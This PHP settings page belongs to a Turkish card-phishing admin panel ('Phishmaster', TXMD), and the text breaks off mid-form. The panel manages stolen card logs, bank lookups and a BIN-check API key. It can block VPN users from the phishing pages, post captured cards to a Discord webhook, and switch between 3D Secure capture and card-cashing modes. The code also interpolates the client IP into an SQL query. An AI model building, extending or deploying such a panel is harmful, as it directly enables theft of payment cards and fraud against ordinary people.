<?php include_once(__DIR__ . "/../config.php"); include_once(__DIR__ . "/Data/Server/GrabIP.php"); include_once(__DIR__ . "/function/MainFunction.php"); giris_dogrulama($pdo);

  $QueryClient = $pdo->query("SELECT * FROM admin WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  $QueryServer = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  
  if($QueryServer["ip_filter"] == 1) {
    if(!in_array($ip, $ip_filter_config)) {
      die("IP Firewall - txmd");
    }
  } 


  if($QueryServer["discord_webhook"] == 1) {
    $check_discord_config = "visible";
  } else {
    $check_discord_config = "none";
  }

  if($QueryServer["banner_durum"] == 1) {
    $check_banner_config = "visible";
  } else {
    $check_banner_config = "none";
  }
  
  
  if (isset($_POST['kullanici-adi'])) {
    if(!empty($_POST['kullanici-adi']) and !empty($_POST['sifre'])) {
    $password = password_hash($_POST['sifre'], PASSWORD_DEFAULT);
    $stmt = $pdo->prepare('UPDATE admin SET kullanici_adi = ?, sifre = ? WHERE ip_adresi = ?');
    $stmt->execute([ $_POST['kullanici-adi'], $password, $ip ]);
    if($_POST['kullanici-adi'] == $QueryClient['kullanici_adi']) {
      $stmt1 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt1->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı şifresini değiştirdi!' ]);
    } else {
      $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı kullanıcı adını ['.$_POST['kullanici-adi'].'] olarak değiştirdi!' ]);
    }
    header('Location: settings');
    exit;
    }
  } else if (isset($_POST['isyeri-adi'])) {
    if(!empty($_POST['isyeri-adi']) and $QueryClient['yetki'] == "Superadmin") {
    $stmt = $pdo->prepare('UPDATE admin_settings SET isyeri_adi = ? WHERE id = ?');
    $stmt->execute([ $_POST['isyeri-adi'], 1 ]);
    $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
    $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı işyeri adını ['.$_POST['isyeri-adi'].'] olarak değiştirdi!' ]);
    header('Location: settings');
    exit;
    }
  } else if (isset($_POST['discord-webhook-url'])) {
    if(!empty($_POST['discord-webhook-url']) and $QueryClient['yetki'] == "Superadmin") {
    $stmt = $pdo->prepare('UPDATE admin_settings SET discord_webhook_url = ? WHERE id = ?');
    $stmt->execute([ $_POST['discord-webhook-url'], 1 ]);
    $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
    $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı Discord Webhook linkini değiştirdi!' ]);
    header('Location: settings');
    exit;
    }
  } else if (isset($_POST['banner_url'])) {
    if(!empty($_POST['banner_url']) and $QueryClient['yetki'] == "Superadmin") {
    $stmt = $pdo->prepare('UPDATE admin_settings SET banner_url = ? WHERE id = ?');
    $stmt->execute([ $_POST['banner_url'], 1 ]);
    header('Location: settings');
    exit;
    }
  }
    else if (isset($_POST['banner_url2'])) {
      if(!empty($_POST['banner_url2']) and $QueryClient['yetki'] == "Superadmin") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET banner_yonlendirme = ? WHERE id = ?');
      $stmt->execute([ $_POST['banner_url2'], 1 ]);
      header('Location: settings');
      exit;
      }

    
  } else if (isset($_POST['bank_api_key'])) {
    if(!empty($_POST['bank_api_key']) and $QueryClient['yetki'] == "Superadmin") {
    $stmt = $pdo->prepare('UPDATE admin_settings SET bank_api_key = ? WHERE id = ?');
    $stmt->execute([ $_POST['bank_api_key'], 1 ]);
    $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
    $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı Banka Api keyini değiştirdi!' ]);
    header('Location: settings');
    exit;
    }
  } else if (isset($_POST['ip-ban'])) {
    if(!empty($_POST['ip-ban']) and $QueryClient['yetki'] == "Superadmin") {
    $yasakla = $_POST['ip-ban'];
    $curl = curl_init();
    curl_setopt_array($curl, [
    	CURLOPT_URL => "http://ip-api.com/json/$yasakla",
    	CURLOPT_RETURNTRANSFER => true,
    	CURLOPT_FOLLOWLOCATION => true,
    	CURLOPT_ENCODING => "",
    	CURLOPT_MAXREDIRS => 10,
    	CURLOPT_TIMEOUT => 30,
    	CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    ]);
    $response = curl_exec($curl);
    $err = curl_error($curl);
    curl_close($curl);
    if ($err) {
    	echo "cURL Error #:" . $err;
    } else {
    	$json = json_decode($response);
      $il = $json->regionName;
      $ilce = $json->city;
      if($il == null) {
        $il = "Bulunamadı";
      }
      if($ilce == null) {
        $ilce = "Bulunamadı";
      }
    }
    $stmt = $pdo->prepare('INSERT INTO bans SET ip=?, konum=?, cihaz=?, tarayici=?, tarih=?');
    $stmt->execute([ $_POST['ip-ban'], ($il.', '.$ilce), 'Bilinmiyor', 'Bilinmiyor', date('d.m.Y H:i') ]);
    $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
    $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı ['.$_POST['ip-ban'].'] ipsine sahip olan kişiyi yasakladı!' ]);
    header('Location: settings');
    exit;
    }
  }

  if(isset($_POST['proxy_vpn'])) {
    if($_POST['proxy_vpn'] == "aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET proxy_vpn = ?');
      $stmt->execute([ 1 ]);
      $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı Proxy & VPN Engeli ayarını aktifleştirdi!' ]);
      header("Location: settings");
    } else if($_POST['proxy_vpn'] == "de-aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET proxy_vpn = ?');
      $stmt->execute([ 0 ]);
      $stmt3 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt3->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı Proxy & VPN Engeli ayarını de-aktifleştirdi!' ]);
      header("Location: settings");
    }
  }

  if(isset($_POST['sound_notify'])) {
    if($_POST['sound_notify'] == "aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET sound_notify = ?');
      $stmt->execute([ 1 ]);
      $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı Sesli Bildirim ayarını aktifleştirdi!' ]);
      header("Location: settings");
    } else if($_POST['sound_notify'] == "de-aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET sound_notify = ?');
      $stmt->execute([ 0 ]);
      $stmt3 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt3->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı Sesli Bildirim ayarını de-aktifleştirdi!' ]);
      header("Location: settings");
    }
  }

  if(isset($_POST['ip_filter']) and $QueryClient['yetki'] == "Superadmin") {
    if($_POST['ip_filter'] == "aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET ip_filter = ?');
      $stmt->execute([ 1 ]);
      $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı IP Filtre Koruması ayarını aktifleştirdi!' ]);
      header("Location: settings");
    } else if($_POST['ip_filter'] == "de-aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET ip_filter = ?');
      $stmt->execute([ 0 ]);
      $stmt3 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt3->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı IP Filtre Koruması ayarını de-aktifleştirdi!' ]);
      header("Location: settings");
    }
  }

  if(isset($_POST['discord_webhook']) and $QueryClient['yetki'] == "Superadmin") {
    if($_POST['discord_webhook'] == "aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET discord_webhook = ?');
      $stmt->execute([ 1 ]);
      $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı Discord Webhook ayarını aktifleştirdi!' ]);
      header("Location: settings");
    } else if($_POST['discord_webhook'] == "de-aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET discord_webhook = ?');
      $stmt->execute([ 0 ]);
      $stmt3 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt3->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı Discord Webhook ayarını de-aktifleştirdi!' ]);
      header("Location: settings");
    }
  }

  if(isset($_POST['banner_durum']) and $QueryClient['yetki'] == "Superadmin") {
    if($_POST['banner_durum'] == "aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET banner_durum = ?');
      $stmt->execute([ 1 ]);
      header("Location: settings");
    } else if($_POST['banner_durum'] == "de-aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET banner_durum = ?');
      $stmt->execute([ 0 ]);
      header("Location: settings");
    }
  }

  if(isset($_POST['secure_code']) and $QueryClient['yetki'] == "Superadmin") {
    if($_POST['secure_code'] == "aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET secure_code = ?');
      $stmt->execute([ 1 ]);
      $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt2->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı 3D Güvenli Kod ayarını aktifleştirdi!' ]);
      header("Location: settings");
    } else if($_POST['secure_code'] == "de-aktif") {
      $stmt = $pdo->prepare('UPDATE admin_settings SET secure_code = ?');
      $stmt->execute([ 0 ]);
      $stmt3 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
      $stmt3->execute([ $QueryClient['kullanici_adi'], $QueryClient['yetki'], $QueryClient['ip_adresi'], $QueryClient['kullanici_adi'].', isimli kullanıcı 3D Güvenli Kod ayarını de-aktifleştirdi!' ]);
      header("Location: settings");
    }
  }
?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title><?php echo isset($page_title) ? $page_title : 'TXMD - Ayarlar'; ?></title>
    <meta name="description" content="<?php echo isset($page_description) ? $page_description : 'TXMD Panel'; ?>">
    <meta name="author" content="TXMD">
    <meta name="robots" content="noindex, nofollow">
    
    <meta property="og:title" content="<?php echo isset($page_title) ? $page_title : 'TXMD Panel'; ?>">
    <meta property="og:site_name" content="Developed TXMD">
    <meta property="og:description" content="<?php echo isset($page_description) ? $page_description : 'TXMD Panel'; ?>">
    <meta property="og:type" content="website">

    <link rel="shortcut icon" href="assets/media/favicons/favicon.png">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/media/favicons/favicon-192x192.png">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/media/favicons/apple-touch-icon-180x180.png">
    <link rel="stylesheet" id="css-main" href="assets/css/oneui.min.css">
  </head>
  <body>
    <div id="page-container" class="sidebar-o sidebar-light enable-page-overlay side-scroll page-header-fixed remember-theme">
      <nav id="sidebar" aria-label="Main Navigation">
        <div class="content-header">
          <a class="fw-semibold text-dual" href="main">
            <span class="smini-visible">
              <i class="fa-solid fa-crosshairs text-primary"></i>
            </span>
            <span class="smini-hide fs-5 tracking-wider">Phish<span class="fw-normal">master</span></span>
          </a>
          <div>
            <button type="button" class="btn btn-sm btn-alt-secondary" data-toggle="layout" data-action="dark_mode_toggle">
              <i class="fa fa-moon"></i>
            </button>
            <div class="dropdown d-inline-block ms-1">
              <button type="button" class="btn btn-sm btn-alt-secondary" id="sidebar-themes-dropdown" data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-haspopup="true" aria-expanded="false">
                <i class="fa fa-brush"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-end fs-sm smini-hide border-0" aria-labelledby="sidebar-themes-dropdown">
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="default">
                  <span>Varsayılan</span>
                  <i class="fa fa-circle text-default"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/amethyst.min.css">
                  <span>Stil 1</span>
                  <i class="fa fa-circle text-amethyst"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/city.min.css">
                  <span>Stil 2</span>
                  <i class="fa fa-circle text-city"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/flat.min.css">
                  <span>Stil 3</span>
                  <i class="fa fa-circle text-flat"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/modern.min.css">
                  <span>Stil 4</span>
                  <i class="fa fa-circle text-modern"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/smooth.min.css">
                  <span>Stil 5</span>
                  <i class="fa fa-circle text-smooth"></i>
                </button>
              </div>
            </div>
            <a class="d-lg-none btn btn-sm btn-alt-secondary ms-1" data-toggle="layout" data-action="sidebar_close" href="javascript:void(0)">
              <i class="fa fa-fw fa-times"></i>
            </a>
          </div>
        </div>
        <div class="js-sidebar-scroll">
          <div class="content-side">
            <ul class="nav-main">
              <li class="nav-main-item">
                <a class="nav-main-link" href="main">
                  <i class="nav-main-link-icon si si-speedometer"></i>
                  <span class="nav-main-link-name">Anasayfa</span>
                </a>
              </li>
              <li class="nav-main-heading">PHISHING</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="logs">
                  <i class="nav-main-link-icon si si-credit-card"></i>
                  <span class="nav-main-link-name">Log Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="bans">
                  <i class="nav-main-link-icon si si-ban"></i>
                  <span class="nav-main-link-name">Ban Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="banks">
                  <i class="nav-main-link-icon fa fa-bank"></i>
                  <span class="nav-main-link-name">Banka Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="urunler">
                  <i class="nav-main-link-icon fa fa-cart-shopping"></i>
                  <span class="nav-main-link-name">Ürün Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="address">
                  <i class="nav-main-link-icon fa fa-map"></i>
                  <span class="nav-main-link-name">Adres Tablosu</span>
                </a>
              </li>
              <li class="nav-main-heading">ARACLAR</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="check_usom">
                  <i class="nav-main-link-icon fa fa-check-double"></i>
                  <span class="nav-main-link-name">USOM Kontrolü</span>
                </a>
              </li>
              <?php if($QueryClient['yetki'] == "Superadmin"): ?>
              <li class="nav-main-heading">YONETIM</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="user">
                  <i class="nav-main-link-icon si si-people"></i>
                  <span class="nav-main-link-name">Kullanıcı Yönetimi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="action_history">
                  <i class="nav-main-link-icon si si-list"></i>
                  <span class="nav-main-link-name">İşlem Geçmişi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="factory_reset">
                  <i class="nav-main-link-icon fa-solid fa-wrench"></i>
                  <span class="nav-main-link-name">Fabrika Ayarları</span>
                </a>
              </li>
              <?php endif; ?>
            </ul>
          </div>
        </div>
      </nav>
      <header id="page-header">
        <div class="content-header">
          <div class="d-flex align-items-center">
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-lg-none" data-toggle="layout" data-action="sidebar_toggle">
              <i class="fa fa-fw fa-bars"></i>
            </button>
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-none d-lg-inline-block" data-toggle="layout" data-action="sidebar_mini_toggle">
              <i class="fa fa-fw fa-ellipsis-v"></i>
            </button>
          </div>
          <div class="d-flex align-items-center">
            <div class="dropdown d-inline-block ms-2">
              <button type="button" class="btn btn-sm btn-alt-secondary d-flex align-items-center" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <img class="rounded-circle" src="assets/media/avatars/avatar0.jpg" style="width: 21px;">  
                <span class="d-none d-sm-inline-block ms-2"><?php echo $QueryClient['kullanici_adi']; ?></span>
                <i class="fa fa-fw fa-angle-down d-none d-sm-inline-block opacity-50 ms-1 mt-1"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-md dropdown-menu-end p-0 border-0" aria-labelledby="page-header-user-dropdown">
                <div class="p-3 text-center bg-body-light border-bottom rounded-top">
                  <p class="mt-2 mb-0 fw-medium"><?php echo $QueryClient['kullanici_adi']; ?></p>
                  <p class="mb-0 text-muted fs-sm fw-medium"><?php echo $QueryClient['yetki']; ?></p>
                </div>
                <div class="p-2">
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="settings">
                    <span class="fs-sm fw-medium">Ayarlar</span>
                  </a>
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="quit">
                    <span class="fs-sm fw-medium">Çıkış Yap</span>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </header>
      <main id="main-container">
        <div class="bg-body-light">
          <div class="content content-full">
            <div class="d-flex flex-column flex-sm-row justify-content-sm-between align-items-sm-center py-2">
              <div class="flex-grow-1">
                <h1 class="h3 fw-bold mb-2"> Ayarlar </h1>
                <h2 class="fs-base lh-base fw-medium text-muted mb-0">
                    <?php echo $mesaj; ?> <a class="link-fx" href="javascript:void(0)"><?php echo $QueryClient['kullanici_adi']; ?></a>, bu sayfa sayesinde panel ayarlarına erişebilirsin.
                </h2>
              </div>
              <nav class="flex-shrink-0 mt-3 mt-sm-0 ms-sm-3" aria-label="breadcrumb">
                <ol class="breadcrumb breadcrumb-alt">
                  <li class="breadcrumb-item" aria-current="page"> Ayarlar </li>
                </ol>
              </nav>
            </div>
          </div>
        </div>
        <div class="content">
          <div class="col-12">
            <div class="block block-rounded row g-0">
              <ul class="nav nav-tabs nav-tabs-block flex-md-column col-md-4 col-xxl-2" role="tablist">
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start active" id="kullanici-duzenleme-buton" data-bs-toggle="tab" data-bs-target="#kullanici-duzenleme" role="tab" aria-controls="kullanici-duzenleme" aria-selected="true">
                    <i class="fa fa-fw fa-user-edit opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Kullanıcı Düzenleme</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panele giriş yaptığınız kullanıcı hesabını düzenleyebilirsin.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="genel-ayarlar-buton" data-bs-toggle="tab" data-bs-target="#genel-ayarlar" role="tab" aria-controls="genel-ayarlar" aria-selected="false">
                    <i class="fa fa-fw fa-gears opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Genel Ayarlar</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Paneldeki genel ayarları kontrol edebilirsin.
                    </span>
                  </button>
                </li>
                <?php if($QueryClient['yetki'] == "Superadmin"): ?>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="ip-banla-buton" data-bs-toggle="tab" data-bs-target="#ip-banla" role="tab" aria-controls="ip-banla" aria-selected="false">
                    <i class="fa fa-fw fa-ban opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>IP Banla</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Bildiğiniz IP'yi banlayarak kişiyi yasaklayabilirsiniz.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="bin-check-api-buton" data-bs-toggle="tab" data-bs-target="#bin-check-api" role="tab" aria-controls="bin-check-api" aria-selected="false">
                    <i class="fa fa-fw fa-bank opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>BIN Check Api Key</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Banka bulma apisini değiştirebilirsiniz.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="isyeri-adi-degistir-buton" data-bs-toggle="tab" data-bs-target="#isyeri-adi-degistir" role="tab" aria-controls="isyeri-adi-degistir" aria-selected="false">
                    <i class="fa fa-fw fa-brands fa-stripe opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>İşyeri Adı Değiştir</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Sanal Pos'un işyeri adını değiştirebilirsiniz.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="banner-degistir-buton" data-bs-toggle="tab" data-bs-target="#banner-degistir" role="tab" aria-controls="banner-degistir" aria-selected="false" style="display: <?php echo $check_banner_config; ?>">
                    <i class="fa fa-fw fa-solid fa-cog opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Banner URL Değiştir</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Anasayfadaki bannerin durumunu ve urlsini buradan değiştirebilirsiniz.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="discord-webhook-buton" data-bs-toggle="tab" data-bs-target="#discord-webhook" role="tab" aria-controls="discord-webhook" aria-selected="false" style="display: <?php echo $check_discord_config; ?>">
                    <i class="fa fa-fw fa-brands fa-discord opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Discord Webhook Linki</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Discord Webhook Link ayarını buradan değiştirebilirsin.
                    </span>
                  </button>
                </li>
                <?php endif; ?>
              </ul>
              <div class="tab-content col-md-8 col-xxl-10">
                <div class="block-content tab-pane active" id="kullanici-duzenleme" role="tabpanel" aria-labelledby="kullanici-duzenleme-buton" tabindex="0">
                  <h4 class="fw-semibold">Kullanıcı Düzenleme</h4>
                  <form method="POST" class="kullanici-duzenleme">
                    <div class="mb-2 col-md-4">
                      <label class="form-label" for="kullanici-adi">Kullanıcı Adı</label>
                      <input type="text" class="form-control" id="kullanici-adi" name="kullanici-adi" placeholder="Kullanıcı Adı" value="<?php echo $QueryClient['kullanici_adi']; ?>">
                    </div>
                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="sifre">Şifre</label>
                      <input type="password" class="form-control" id="sifre" name="sifre" placeholder="Şifre">
                    </div>
                    <div class="mb-4">
                      <button type="submit" class="btn btn-sm btn-success">
                        <i class="fa fa-fw fa-refresh me-1"></i> Kullanıcı Düzenle
                      </button>
                      <button type="button" onclick="SifreOlustur();" class="btn btn-sm btn-success">
                      <i class="fa-solid fa-repeat me-1"></i> Şifre Oluştur
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="genel-ayarlar" role="tabpanel" aria-labelledby="genel-ayarlar-buton" tabindex="0">
                  <h4 class="fw-semibold">Genel Ayarlar</h4>
                  <div>
                   <form method="POST">
                    <div class="mb-4">
                      <label class="form-label" data-bs-toggle="tooltip" data-bs-animation="true" data-bs-placement="top" title="Bu ayarı açarsanız VPN, VDS ve Proxyler phishinginize giremez ve log gönderemez.">Proxy & VPN Engeli</label>
                      <div class="space-y-2">
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="proxy_vpn_aktif" name="proxy_vpn" value="aktif" onclick="form.submit();" <?php if($QueryServer["proxy_vpn"] == 1) { echo("checked"); } ?>>
                          <label class="form-check-label" for="proxy_vpn_aktif">Aktif</label>
                        </div>
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="proxy_vpn_deaktif" name="proxy_vpn" value="de-aktif" onclick="form.submit();" <?php if($QueryServer["proxy_vpn"] == 0) { echo("checked"); } ?>>
                          <label class="form-check-label" for="proxy_vpn_deaktif">De-Aktif</label>
                        </div>
                      </div>
                    </div>
                   </form>
                   <form method="POST">
                    <div class="mb-4">
                      <label class="form-label" data-bs-toggle="tooltip" data-bs-animation="true" data-bs-placement="top" title="Bu ayarı açarsanız Log ve SMS girildiğinde sesli olarak uyarı alırsınız.">Sesli Bildirim</label>
                      <div class="space-y-2">
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="sound_notify_aktif" name="sound_notify" value="aktif" onclick="form.submit();" <?php if($QueryServer["sound_notify"] == 1) { echo("checked"); } ?>>
                          <label class="form-check-label" for="sound_notify_aktif">Aktif</label>
                        </div>
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="sound_notify_deaktif" name="sound_notify" value="de-aktif" onclick="form.submit();" <?php if($QueryServer["sound_notify"] == 0) { echo("checked"); } ?>>
                          <label class="form-check-label" for="sound_notify_deaktif">De-Aktif</label>
                        </div>
                      </div>
                    </div>
                   </form>
                   <?php if($QueryClient['yetki'] == "Superadmin"): ?>
                   <form method="POST">
                    <div class="mb-4">
                      <label class="form-label" data-bs-toggle="tooltip" data-bs-animation="true" data-bs-placement="top" title="Bu ayarı açarsanız 3D vurmanız aktifleşir ve panel kart kasma modundan çıkar.">3D Güvenli Kod</label>
                      <div class="space-y-2">
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="secure_code_aktif" name="secure_code" value="aktif" onclick="form.submit();" <?php if($QueryServer["secure_code"] == 1) { echo("checked"); } ?>>
                          <label class="form-check-label" for="secure_code_aktif">Aktif</label>
                        </div>
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="secure_code_deaktif" name="secure_code" value="de-aktif" onclick="form.submit();" <?php if($QueryServer["secure_code"] == 0) { echo("checked"); } ?>>
                          <label class="form-check-label" for="secure_code_deaktif">De-Aktif</label>
                        </div>
                      </div>
                    </div>
                   </form>
                   <form method="POST">
                    <div class="mb-4">
                      <label class="form-label" data-bs-toggle="tooltip" data-bs-animation="true" data-bs-placement="top" title="Bu ayarı açarsanız panelinize config dosyasından belirlediğiniz IP'ler harici kimse erişemez.">IP Filtre Koruması</label>
                      <div class="space-y-2">
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="ip_filter_aktif" name="ip_filter" value="aktif" onclick="form.submit();" <?php if($QueryServer["ip_filter"] == 1) { echo("checked"); } ?>>
                          <label class="form-check-label" for="ip_filter_aktif">Aktif</label>
                        </div>
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="ip_filter_deaktif" name="ip_filter" value="de-aktif" onclick="form.submit();" <?php if($QueryServer["ip_filter"] == 0) { echo("checked"); } ?>>
                          <label class="form-check-label" for="ip_filter_deaktif">De-Aktif</label>
                        </div>
                      </div>
                    </div>
                   </form>
                   <form method="POST">
                    <div class="mb-4">
                      <label class="form-label" data-bs-toggle="tooltip" data-bs-animation="true" data-bs-placement="top" title="Bu ayarı açarsanız belirlediğiniz discord webhook urlsine kart girildikten sonra log mesajı gönderir.">Discord Webhook</label>
                      <div class="space-y-2">
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="discord_webhook_aktif" name="discord_webhook" value="aktif" onclick="form.submit();" <?php if($QueryServer["discord_webhook"] == 1) { echo("checked"); } ?>>
